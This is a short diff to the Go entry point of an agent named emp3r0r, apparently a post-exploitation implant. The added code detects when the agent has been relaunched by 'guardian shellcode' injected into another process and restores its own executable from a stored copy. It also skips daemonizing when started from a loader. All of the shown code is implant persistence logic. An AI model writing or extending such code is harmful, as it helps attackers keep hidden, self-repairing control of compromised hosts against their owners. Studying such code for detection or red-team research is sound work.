@@ -38,6 +38,18 @@ func main() {
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
+	// check if this process is invoked by guardian shellcode
+	// by checking if process executable is same as parent's
+	if util.ProcExePath(os.Getpid()) == util.ProcExePath(os.Getppid()) {
+		log.Printf("emp3r0r %d is invoked by shellcode in %d", os.Getpid(), os.Getppid())
+		os.Setenv("LD", "true") // it's the same thing, i don't want another env var
+
+		// restore original executable file
+		util.Copy(fmt.Sprintf("%s/%s",
+			agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
+			util.ProcExePath(os.Getpid()))
+	}
+
 	// accept env vars
 	verbose := os.Getenv("VERBOSE") == "true"
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
@@ -82,7 +94,7 @@ func main() {
 		}
 	}
 
-	if !runElvsh {
+	if !runElvsh && !run_from_loader {
 		// always daemonize unless verbose is specified
 		run_as_daemon := !verbose &&
 			// don't daemonize if we're already daemonized
